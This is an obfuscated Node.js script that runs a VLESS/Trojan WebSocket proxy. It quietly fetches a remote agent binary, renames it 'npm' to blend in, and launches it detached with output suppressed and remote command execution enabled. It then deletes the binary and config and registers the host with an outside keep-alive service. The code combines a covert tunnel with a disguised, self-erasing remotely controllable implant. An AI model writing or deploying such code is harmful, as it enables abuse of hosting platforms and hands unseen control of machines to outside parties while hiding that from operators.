function _0x130d(_0x9b0a83,_0x2ff45d){_0x9b0a83=_0x9b0a83-0x153;const _0x308f79=_0x308f();let _0x130dc5=_0x308f79[_0x9b0a83];return _0x130dc5;}const _0x5c4985=_0x130d;(function(_0x345021,_0xc05aa3){const _0x3572e3=_0x130d,_0x42b08b=_0x345021();while(!![]){try{const _0x32e694=-parseInt(_0x3572e3(0x172))/0x1+-parseInt(_0x3572e3(0x15c))/0x2+parseInt(_0x3572e3(0x185))/0x3*(parseInt(_0x3572e3(0x1bc))/0x4)+parseInt(_0x3572e3(0x17c))/0x5*(parseInt(_0x3572e3(0x16d))/0x6)+-parseInt(_0x3572e3(0x1ca))/0x7*(-parseInt(_0x3572e3(0x175))/0x8)+parseInt(_0x3572e3(0x19b))/0x9*(-parseInt(_0x3572e3(0x1b3))/0xa)+parseInt(_0x3572e3(0x1b5))/0xb*(-parseInt(_0x3572e3(0x183))/0xc);if(_0x32e694===_0xc05aa3)break;else _0x42b08b['push'](_0x42b08b['shift']());}catch(_0x490694){_0x42b08b['push'](_0x42b08b['shift']());}}}(_0x308f,0x777a0));const os=require('os'),http=require(_0x5c4985(0x193)),fs=require('fs'),axios=require(_0x5c4985(0x18d)),net=require(_0x5c4985(0x1af)),path=require('path'),crypto=require(_0x5c4985(0x1a9)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x5c4985(0x18a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5c4985(0x174)][_0x5c4985(0x1b1)]||'f5f7b337-a4a5-4623-a51c-b3f772e4ab14',NEZHA_SERVER=process['env'][_0x5c4985(0x182)]||'',NEZHA_PORT=process[_0x5c4985(0x174)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x5c4985(0x179)]||'',DOMAIN=process[_0x5c4985(0x174)][_0x5c4985(0x1c2)]||_0x5c4985(0x1b6),AUTO_ACCESS=process[_0x5c4985(0x174)][_0x5c4985(0x153)]||![],WSPATH=process[_0x5c4985(0x174)]['WSPATH']||UUID[_0x5c4985(0x171)](0x0,0x8),SUB_PATH=process['env'][_0x5c4985(0x17d)]||'pxy',NAME=process[_0x5c4985(0x174)][_0x5c4985(0x19c)]||'',PORT=process[_0x5c4985(0x174)][_0x5c4985(0x1aa)]||0x1bb2;let ISP='';const GetISP=async()=>{const _0xd192c5=_0x5c4985;try{const _0x40b565=await axios[_0xd192c5(0x161)](_0xd192c5(0x169)),_0x3cf147=_0x40b565['data'];ISP=(_0x3cf147[_0xd192c5(0x1a1)]+'-'+_0x3cf147[_0xd192c5(0x187)])['replace'](/ /g,'_');}catch(_0x4d3157){ISP=_0xd192c5(0x1b0);}};GetISP();const httpServer=http[_0x5c4985(0x1d0)]((_0x414a27,_0x29c80e)=>{const _0x2a90eb=_0x5c4985;if(_0x414a27['url']==='/'){const _0x16f906=path[_0x2a90eb(0x196)](__dirname,_0x2a90eb(0x176));fs['readFile'](_0x16f906,_0x2a90eb(0x18e),(_0x33491a,_0x234e00)=>{const _0x44cbd9=_0x2a90eb;if(_0x33491a){_0x29c80e[_0x44cbd9(0x19a)](0xc8,{'Content-Type':'text/html'}),_0x29c80e[_0x44cbd9(0x1b4)]('Hello\x20world!');return;}_0x29c80e[_0x44cbd9(0x19a)](0xc8,{'Content-Type':_0x44cbd9(0x188)}),_0x29c80e['end'](_0x234e00);});return;}else{if(_0x414a27['url']==='/'+SUB_PATH){const _0x365fe5=NAME?NAME+'-'+ISP:ISP,_0x3cc518='vless://'+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2a90eb(0x162)+WSPATH+'#'+_0x365fe5,_0x549afb=_0x2a90eb(0x1a7)+UUID+_0x2a90eb(0x1a5)+DOMAIN+_0x2a90eb(0x164)+DOMAIN+_0x2a90eb(0x162)+WSPATH+'#'+_0x365fe5,_0x132761=_0x3cc518+'\x0a'+_0x549afb,_0x490e4c=Buffer[_0x2a90eb(0x1a4)](_0x132761)['toString']('base64');_0x29c80e[_0x2a90eb(0x19a)](0xc8,{'Content-Type':_0x2a90eb(0x195)}),_0x29c80e[_0x2a90eb(0x1b4)](_0x490e4c+'\x0a');}else _0x29c80e[_0x2a90eb(0x19a)](0x194,{'Content-Type':_0x2a90eb(0x195)}),_0x29c80e[_0x2a90eb(0x1b4)](_0x2a90eb(0x1c0));}}),wss=new WebSocket[(_0x5c4985(0x1b2))]({'server':httpServer}),uuid=UUID[_0x5c4985(0x16c)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x5c4985(0x1cc)];function resolveHost(_0x3eb6e6){return new Promise((_0x5040a8,_0x2ed0b2)=>{const _0x1e5f37=_0x130d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1e5f37(0x17b)](_0x3eb6e6)){_0x5040a8(_0x3eb6e6);return;}let _0x333985=0x0;function _0xe5ec8b(){const _0x24dcb8=_0x1e5f37;if(_0x333985>=DNS_SERVERS['length']){_0x2ed0b2(new Error('Failed\x20to\x20resolve\x20'+_0x3eb6e6+_0x24dcb8(0x19f)));return;}const _0x35808a=DNS_SERVERS[_0x333985];_0x333985++;const _0x16184d='https://dns.google/resolve?name='+encodeURIComponent(_0x3eb6e6)+_0x24dcb8(0x18c);axios[_0x24dcb8(0x161)](_0x16184d,{'timeout':0x1388,'headers':{'Accept':_0x24dcb8(0x198)}})[_0x24dcb8(0x1cd)](_0x2e3ace=>{const _0x2c5642=_0x24dcb8,_0x53e249=_0x2e3ace[_0x2c5642(0x1a2)];if(_0x53e249['Status']===0x0&&_0x53e249[_0x2c5642(0x1ce)]&&_0x53e249[_0x2c5642(0x1ce)][_0x2c5642(0x184)]>0x0){const _0x188b49=_0x53e249[_0x2c5642(0x1ce)]['find'](_0x5068ac=>_0x5068ac[_0x2c5642(0x1c4)]===0x1);if(_0x188b49){_0x5040a8(_0x188b49[_0x2c5642(0x1a2)]);return;}}_0xe5ec8b();})[_0x24dcb8(0x16f)](_0x500a5e=>{_0xe5ec8b();});}_0xe5ec8b();});}function _0x308f(){const _0x2b1555=['65HxdHPD','SUB_PATH','npm\x20is\x20running','post','sha224','createHash','NEZHA_SERVER','18151548GXzCpt','length','2810889NpqpRD','https://arm64.ssss.nyc.mn/v1','asOrganization','text/html','https://oooo.serv00.net/add-url','child_process','connection','&type=A','axios','utf8','arm64','--tls','\x20-p\x20','listen','http','2096','text/plain','join','unlink','application/dns-json','every','writeHead','126DtZRbS','NAME','pipe','npm\x20is\x20already\x20running,\x20skip\x20running...','\x20with\x20all\x20DNS\x20servers','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','country','data','hex','from','@cdns.doon.eu.org:443?security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','trojan://','substr','crypto','PORT','reduce','application/json','includes','once','net','Unknown','UUID','Server','235720oRmbRZ','end','11ISyJlP','1234.abc.com','https://amd64.ssss.nyc.mn/v1','log','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','true','trim','4nlzfkW','443','Server\x20is\x20running\x20on\x20port\x20','connect','Not\x20Found\x0a','send','DOMAIN','Automatic\x20Access\x20Task\x20added\x20successfully','type','createWriteStream','arch','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','digest','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','1591184LuDESZ','readUInt8','1.1.1.1','then','Answer','8443','createServer','AUTO_ACCESS','writeFileSync','concat','https://','2053','client_secret:\x20','npm\x20download\x20successfully','finish','aarch64','41462RxYyyd','arm','config.yaml','write','npm','get','&path=%2F','https://amd64.ssss.nyc.mn/agent','&fp=chrome&type=ws&host=','setsid\x20nohup\x20./npm\x20-s\x20','https://arm64.ssss.nyc.mn/agent','readUInt16BE','map','https://speed.cloudflare.com/meta','toString','url','replace','379614uoDYla','close','catch','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','slice','315964ZeYFZT','split','env','32fPOxNp','index.html','2083','decode','NEZHA_KEY','error','test'];_0x308f=function(){return _0x2b1555;};return _0x308f();}function handleVlessConnection(_0x4b1aee,_0x73e644){const _0x3c509b=_0x5c4985,[_0x5f4619]=_0x73e644,_0x15318d=_0x73e644['slice'](0x1,0x11);if(!_0x15318d[_0x3c509b(0x199)]((_0x43f128,_0x34348e)=>_0x43f128==parseInt(uuid[_0x3c509b(0x1a8)](_0x34348e*0x2,0x2),0x10)))return![];let _0x18b05b=_0x73e644[_0x3c509b(0x171)](0x11,0x12)['readUInt8']()+0x13;const _0x287184=_0x73e644[_0x3c509b(0x171)](_0x18b05b,_0x18b05b+=0x2)[_0x3c509b(0x167)](0x0),_0x13b78c=_0x73e644['slice'](_0x18b05b,_0x18b05b+=0x1)[_0x3c509b(0x1cb)](),_0x320fbd=_0x13b78c==0x1?_0x73e644[_0x3c509b(0x171)](_0x18b05b,_0x18b05b+=0x4)[_0x3c509b(0x196)]('.'):_0x13b78c==0x2?new TextDecoder()[_0x3c509b(0x178)](_0x73e644['slice'](_0x18b05b+0x1,_0x18b05b+=0x1+_0x73e644[_0x3c509b(0x171)](_0x18b05b,_0x18b05b+0x1)[_0x3c509b(0x1cb)]())):_0x13b78c==0x3?_0x73e644['slice'](_0x18b05b,_0x18b05b+=0x10)[_0x3c509b(0x1ab)]((_0x15f9a7,_0x4f6c9c,_0x115591,_0x1d1aec)=>_0x115591%0x2?_0x15f9a7[_0x3c509b(0x155)](_0x1d1aec['slice'](_0x115591-0x1,_0x115591+0x1)):_0x15f9a7,[])[_0x3c509b(0x168)](_0xeaff20=>_0xeaff20['readUInt16BE'](0x0)['toString'](0x10))[_0x3c509b(0x196)](':'):'';_0x4b1aee[_0x3c509b(0x1c1)](new Uint8Array([_0x5f4619,0x0]));const _0x9d4df5=createWebSocketStream(_0x4b1aee);return resolveHost(_0x320fbd)['then'](_0x4ad943=>{const _0x24f292=_0x3c509b;net[_0x24f292(0x1bf)]({'host':_0x4ad943,'port':_0x287184},function(){const _0x1c1238=_0x24f292;this['write'](_0x73e644[_0x1c1238(0x171)](_0x18b05b)),_0x9d4df5['on'](_0x1c1238(0x17a),()=>{})[_0x1c1238(0x19d)](this)['on'](_0x1c1238(0x17a),()=>{})[_0x1c1238(0x19d)](_0x9d4df5);})['on']('error',()=>{});})[_0x3c509b(0x16f)](_0x587955=>{const _0x1c3595=_0x3c509b;net[_0x1c3595(0x1bf)]({'host':_0x320fbd,'port':_0x287184},function(){const _0xc262d3=_0x1c3595;this[_0xc262d3(0x15f)](_0x73e644[_0xc262d3(0x171)](_0x18b05b)),_0x9d4df5['on']('error',()=>{})[_0xc262d3(0x19d)](this)['on'](_0xc262d3(0x17a),()=>{})[_0xc262d3(0x19d)](_0x9d4df5);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x477d64,_0x6f18c){const _0xcf31ab=_0x5c4985;try{if(_0x6f18c[_0xcf31ab(0x184)]<0x3a)return![];const _0x76fec4=_0x6f18c['slice'](0x0,0x38)[_0xcf31ab(0x16a)](),_0x574d22=[UUID];let _0x5894c3=null;for(const _0x55a03a of _0x574d22){const _0x41730a=crypto[_0xcf31ab(0x181)](_0xcf31ab(0x180))['update'](_0x55a03a)[_0xcf31ab(0x1c8)](_0xcf31ab(0x1a3));if(_0x41730a===_0x76fec4){_0x5894c3=_0x55a03a;break;}}if(!_0x5894c3)return![];let _0x38743a=0x38;_0x6f18c[_0x38743a]===0xd&&_0x6f18c[_0x38743a+0x1]===0xa&&(_0x38743a+=0x2);const _0x1efa0d=_0x6f18c[_0x38743a];if(_0x1efa0d!==0x1)return![];_0x38743a+=0x1;const _0x20d46a=_0x6f18c[_0x38743a];_0x38743a+=0x1;let _0x37f2d7,_0x29bc1f;if(_0x20d46a===0x1)_0x37f2d7=_0x6f18c['slice'](_0x38743a,_0x38743a+0x4)[_0xcf31ab(0x196)]('.'),_0x38743a+=0x4;else{if(_0x20d46a===0x3){const _0x264271=_0x6f18c[_0x38743a];_0x38743a+=0x1,_0x37f2d7=_0x6f18c['slice'](_0x38743a,_0x38743a+_0x264271)[_0xcf31ab(0x16a)](),_0x38743a+=_0x264271;}else{if(_0x20d46a===0x4)_0x37f2d7=_0x6f18c[_0xcf31ab(0x171)](_0x38743a,_0x38743a+0x10)[_0xcf31ab(0x1ab)]((_0x91a920,_0x5ebbf1,_0x50e889,_0x47641f)=>_0x50e889%0x2?_0x91a920[_0xcf31ab(0x155)](_0x47641f[_0xcf31ab(0x171)](_0x50e889-0x1,_0x50e889+0x1)):_0x91a920,[])['map'](_0x2d90ac=>_0x2d90ac[_0xcf31ab(0x167)](0x0)['toString'](0x10))[_0xcf31ab(0x196)](':'),_0x38743a+=0x10;else return![];}}_0x29bc1f=_0x6f18c[_0xcf31ab(0x167)](_0x38743a),_0x38743a+=0x2;_0x38743a<_0x6f18c[_0xcf31ab(0x184)]&&_0x6f18c[_0x38743a]===0xd&&_0x6f18c[_0x38743a+0x1]===0xa&&(_0x38743a+=0x2);const _0x529f5e=createWebSocketStream(_0x477d64);return resolveHost(_0x37f2d7)[_0xcf31ab(0x1cd)](_0x217429=>{const _0x1e3158=_0xcf31ab;net[_0x1e3158(0x1bf)]({'host':_0x217429,'port':_0x29bc1f},function(){const _0x4fc32c=_0x1e3158;_0x38743a<_0x6f18c[_0x4fc32c(0x184)]&&this[_0x4fc32c(0x15f)](_0x6f18c['slice'](_0x38743a)),_0x529f5e['on'](_0x4fc32c(0x17a),()=>{})[_0x4fc32c(0x19d)](this)['on'](_0x4fc32c(0x17a),()=>{})['pipe'](_0x529f5e);})['on'](_0x1e3158(0x17a),()=>{});})[_0xcf31ab(0x16f)](_0x2681ee=>{const _0x1c60d5=_0xcf31ab;net[_0x1c60d5(0x1bf)]({'host':_0x37f2d7,'port':_0x29bc1f},function(){const _0x238683=_0x1c60d5;_0x38743a<_0x6f18c[_0x238683(0x184)]&&this['write'](_0x6f18c[_0x238683(0x171)](_0x38743a)),_0x529f5e['on']('error',()=>{})[_0x238683(0x19d)](this)['on']('error',()=>{})[_0x238683(0x19d)](_0x529f5e);})['on'](_0x1c60d5(0x17a),()=>{});}),!![];}catch(_0x529434){return![];}}wss['on'](_0x5c4985(0x18b),(_0x226fa2,_0x7b874b)=>{const _0x3d0e05=_0x5c4985,_0x186cae=_0x7b874b[_0x3d0e05(0x16b)]||'';_0x226fa2[_0x3d0e05(0x1ae)]('message',_0x2586de=>{const _0x49444b=_0x3d0e05;if(_0x2586de[_0x49444b(0x184)]>0x11&&_0x2586de[0x0]===0x0){const _0x4adbe4=_0x2586de[_0x49444b(0x171)](0x1,0x11),_0x2e9c56=_0x4adbe4[_0x49444b(0x199)]((_0x1f0bd9,_0x4a5bce)=>_0x1f0bd9==parseInt(uuid['substr'](_0x4a5bce*0x2,0x2),0x10));if(_0x2e9c56){!handleVlessConnection(_0x226fa2,_0x2586de)&&_0x226fa2['close']();return;}}!handleTrojanConnection(_0x226fa2,_0x2586de)&&_0x226fa2[_0x49444b(0x16e)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x35f6dd=_0x5c4985,_0x49ffc9=os[_0x35f6dd(0x1c6)]();return _0x49ffc9===_0x35f6dd(0x15d)||_0x49ffc9===_0x35f6dd(0x18f)||_0x49ffc9===_0x35f6dd(0x15b)?!NEZHA_PORT?_0x35f6dd(0x186):_0x35f6dd(0x166):!NEZHA_PORT?_0x35f6dd(0x1b7):_0x35f6dd(0x163);},downloadFile=async()=>{const _0x5a783c=_0x5c4985;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x599d22=getDownloadUrl(),_0x5642a1=await axios({'method':_0x5a783c(0x161),'url':_0x599d22,'responseType':'stream'}),_0x12d386=fs[_0x5a783c(0x1c5)]('npm');return _0x5642a1[_0x5a783c(0x1a2)][_0x5a783c(0x19d)](_0x12d386),new Promise((_0xfffadc,_0x18bde3)=>{const _0x170496=_0x5a783c;_0x12d386['on'](_0x170496(0x15a),()=>{const _0xdd088a=_0x170496;console[_0xdd088a(0x1b8)](_0xdd088a(0x159)),exec('chmod\x20+x\x20npm',_0x23d22a=>{if(_0x23d22a)_0x18bde3(_0x23d22a);_0xfffadc();});}),_0x12d386['on'](_0x170496(0x17a),_0x18bde3);});}catch(_0x3f52f9){throw _0x3f52f9;}},runnz=async()=>{const _0x1a11f0=_0x5c4985;try{const _0x2e58b8=execSync(_0x1a11f0(0x1c9),{'encoding':'utf-8'});if(_0x2e58b8[_0x1a11f0(0x1bb)]()!==''){console[_0x1a11f0(0x1b8)](_0x1a11f0(0x19e));return;}}catch(_0x25953e){}await downloadFile();let _0x4958c9='',_0x5d56d4=[_0x1a11f0(0x1bd),_0x1a11f0(0x1cf),_0x1a11f0(0x194),'2087',_0x1a11f0(0x177),_0x1a11f0(0x157)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x165762=_0x5d56d4[_0x1a11f0(0x1ad)](NEZHA_PORT)?_0x1a11f0(0x190):'';_0x4958c9=_0x1a11f0(0x165)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1a11f0(0x191)+NEZHA_KEY+'\x20'+_0x165762+_0x1a11f0(0x1a0);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5224d7=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1a11f0(0x173)](':')['pop']():'',_0x52fd00=_0x5d56d4[_0x1a11f0(0x1ad)](_0x5224d7)?_0x1a11f0(0x1ba):'false',_0x346f5c=_0x1a11f0(0x158)+NEZHA_KEY+_0x1a11f0(0x1b9)+NEZHA_SERVER+_0x1a11f0(0x170)+_0x52fd00+_0x1a11f0(0x1a6)+UUID;fs[_0x1a11f0(0x154)](_0x1a11f0(0x15e),_0x346f5c);}_0x4958c9='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x1a11f0(0x1b8)](_0x1a11f0(0x1c7));return;}}try{exec(_0x4958c9,{'shell':'/bin/bash'},_0x4ade96=>{const _0x317f2a=_0x1a11f0;if(_0x4ade96)console[_0x317f2a(0x17a)]('npm\x20running\x20error:',_0x4ade96);else console[_0x317f2a(0x1b8)](_0x317f2a(0x17e));});}catch(_0x981b0){console['error']('error:\x20'+_0x981b0);}};async function addAccessTask(){const _0x2c75aa=_0x5c4985;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x35b93e=_0x2c75aa(0x156)+DOMAIN+'/'+SUB_PATH;try{const _0x36942b=await axios[_0x2c75aa(0x17f)](_0x2c75aa(0x189),{'url':_0x35b93e},{'headers':{'Content-Type':_0x2c75aa(0x1ac)}});console[_0x2c75aa(0x1b8)](_0x2c75aa(0x1c3));}catch(_0x1ecc85){}}const delFiles=()=>{const _0x3b1bac=_0x5c4985;fs[_0x3b1bac(0x197)](_0x3b1bac(0x160),()=>{}),fs[_0x3b1bac(0x197)](_0x3b1bac(0x15e),()=>{});};httpServer[_0x5c4985(0x192)](PORT,()=>{const _0x38726d=_0x5c4985;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x38726d(0x1be)+PORT);});
